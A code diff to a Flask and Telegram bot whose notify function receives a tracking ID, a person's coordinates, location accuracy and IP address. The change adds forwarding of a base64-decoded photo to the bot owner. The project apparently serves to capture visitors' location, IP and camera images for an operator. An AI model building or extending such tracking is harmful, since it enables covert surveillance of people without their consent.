@@ -9,6 +9,8 @@ import sqlite3
 import hashlib
 import time
 import asyncio
+import base64
+from io import BytesIO
 from datetime import datetime
 from flask import Flask, render_template, request, jsonify
 from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
@@ -249,7 +251,17 @@ async def notify(tracking_id, lat, lon, accuracy, ip, data=None):
         [InlineKeyboardButton("📊 Riwayat", callback_data=f"ev:{tracking_id}")],
     ]
     try:
-        await bot.send_message(owner_id, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
+        photo_data = data.get('photo') if data else None
+        if photo_data and photo_data.startswith('data:image'):
+            # Send as photo with caption
+            photo_bytes = base64.b64decode(photo_data.split(',')[1])
+            photo_io = BytesIO(photo_bytes)
+            photo_io.name = 'photo.jpg'
+            await bot.send_photo(owner_id, photo_io, caption=text,
+                reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
+        else:
+            await bot.send_message(owner_id, text,
+                reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
     except Exception as e:
         print(f"Notif error: {e}")
 
